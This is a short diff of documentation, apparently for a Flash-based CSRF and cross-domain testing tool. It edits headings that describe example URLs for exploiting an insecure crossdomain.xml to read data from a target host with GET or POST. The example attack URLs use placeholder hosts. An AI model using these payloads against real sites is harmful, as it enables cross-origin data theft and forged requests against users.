@@ -40,11 +40,11 @@ https://example.com/read.html?jsonData={"test":1}&php_url=https://example.com/te
 ```
 https://example.com/test.swf?jsonData=[xmldada]&php_url=https://example.com/test.php&endpoint=https://sometargethost.com/endpoint&ct=application/xml
 ```
-3) Exploit insecure crossdomain.xml (read data from target), GET-based, no redirect:
+3) Exploit insecure crossdomain.xml (read data from target), GET-based, no 307 redirect:
 ```
 https://example.com/read.html?jsonData=&endpoint=https://sometargethost.com/endpoint&reqmethod=GET
 ```
-4) Exploit insecure crossdomain.xml (read data from target), POST-based, any content-type supported, no redirect:
+4) Exploit insecure crossdomain.xml (read data from target), POST-based, any content-type supported, no 307 redirect:
 ```
 https://example.com/read.html?jsonData=somedata&endpoint=https://sometargethost.com/endpoint&ct=text/html
 ```
